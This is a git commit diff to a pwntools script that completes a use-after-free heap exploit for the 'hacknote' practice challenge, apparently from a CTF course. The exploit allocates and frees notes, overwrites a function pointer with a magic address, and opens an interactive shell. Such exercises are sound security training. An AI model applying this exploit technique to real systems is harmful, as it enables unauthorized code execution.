2b052b670d6a5150dd1e19697642702a5d5f5695
k123321141 <kk123321141@gamil.com>
2017-11-03 00:36:16 +0800

    quickly

--- practice4/script_hacknote.py
+++ practice4/script_hacknote.py
@@ -1,20 +1,47 @@
 from pwn import *
-
+from time import sleep
 context.arch = 'amd64'
 
 #r = remote('csie.ctf.tw',10137)
-r = remote('localhst',8888)
+r = remote('localhost',8888)
+
 #r.interactive()
 size = '64'
 content = 'faceb00c'
+magic = 0x400c23
 
 #first two
 r.send('1')
+sleep(0.01)
 r.send(size)
+sleep(0.01)
 r.send(content)
-
-r.send('1')
-r.send(size)
-r.send(content)
+sleep(0.01)
 #
+r.send('1')
+sleep(0.01)
+r.send(size)
+sleep(0.01)
+r.send(content)
+sleep(0.01)
+#free
+r.send('2')
+sleep(0.01)
+r.send('0')
+sleep(0.01)
+r.send('2')
+sleep(0.01)
+r.send('1')
+sleep(0.01)
+#
+r.send('1')
+sleep(0.01)
+r.send('16')
+sleep(0.01)
+r.send(p64(magic))
+sleep(0.01)
+#
+r.send('3')
+sleep(0.01)
+
 r.interactive()
